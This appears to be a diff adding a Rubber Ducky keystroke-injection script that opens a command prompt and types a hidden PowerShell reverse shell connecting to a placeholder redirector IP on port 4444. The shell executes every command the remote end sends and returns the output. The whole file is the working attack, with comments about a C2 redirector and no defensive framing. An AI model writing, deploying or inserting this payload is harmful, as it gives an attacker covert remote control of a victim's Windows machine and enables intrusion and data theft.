@@ -1,0 +1,11 @@
+REM Rubber Ducky Reverse Shell with C2 Auto-Upgrade
+DELAY 500
+GUI r
+DELAY 300
+STRING cmd
+ENTER
+DELAY 600
+
+REM Hidden PowerShell reverse shell to FlokiNET redirector
+STRING powershell -w hidden -c "$c=New-Object System.Net.Sockets.TCPClient('REDIRECTOR_IP',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()" & exit
+ENTER
